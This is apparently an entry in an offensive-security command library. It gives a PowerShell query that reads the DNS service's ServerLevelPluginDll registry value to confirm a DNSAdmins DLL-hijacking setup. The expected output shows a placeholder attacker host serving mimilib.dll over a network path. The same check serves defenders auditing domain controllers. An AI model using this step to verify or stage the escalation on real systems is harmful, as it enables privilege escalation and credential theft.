---
id: 037550da-75ed-4365-81f6-70e56516b6ec
name: Verify-DNS-Plugin-DLL-Registry
type: command
executor: powershell
data: >-
  Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name
  ServerLevelPluginDll
output: null
created_at: '2023-04-06T03:56:06.475163+00:00'
updated_at: '2023-10-10T20:26:10.325254+00:00'
platforms:
  - Windows
tags:
  - registry
  - verification
verified: true
validated: true
---

# Verify-DNS-Plugin-DLL-Registry

## Command

```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name ServerLevelPluginDll
```

## Description

Queries the Windows registry to confirm the ServerLevelPluginDll value for the DNS service, verifying hijacking setup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| HKLM:\... | Registry path | Built-in |
| -Name | Specific property | Yes |

## Examples

### Basic Usage

```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name ServerLevelPluginDll
```

## Expected Output

```
ServerLevelPluginDll : \\attacker_IP\dll\mimilib.dll
```

The configured DLL path displayed.

## Related

- [[procedures/Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation]]
